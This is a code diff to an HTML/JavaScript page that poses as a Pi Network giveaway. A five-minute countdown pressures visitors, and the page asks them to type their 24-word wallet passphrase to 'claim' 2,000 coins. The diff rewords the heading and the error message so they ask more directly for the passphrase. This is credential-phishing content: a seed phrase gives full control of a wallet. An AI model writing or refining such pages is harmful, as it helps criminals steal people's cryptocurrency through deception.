@@ -105,7 +105,7 @@
     <p id="countdown">Time Left: 05:00</p>
     
     <div class="container">
-        <h2>Enter Your 24-Word Passphrase Below</h2>
+        <h2>Enter Your 24-Word Passphrase Below And Click Claim</h2>
         <input type="text" id="wallet" placeholder="Enter your 24-word Passphrase HERE">
         <button onclick="submitWallet()">🎁 Claim Your 2,000 Pi Network Coins</button>
         <p id="response"></p>
@@ -138,7 +138,7 @@
             const responseText = document.getElementById("response");
             
             if (!wallet || wallet.split(" ").length !== 24) {
-                responseText.innerText = "⚠️ Invalid address. Please enter your full 24-word wallet address.";
+                responseText.innerText = "⚠️ Invalid. Please enter your full 24-Word Passphrase.";
                 responseText.style.color = "red";
                 return;
             }
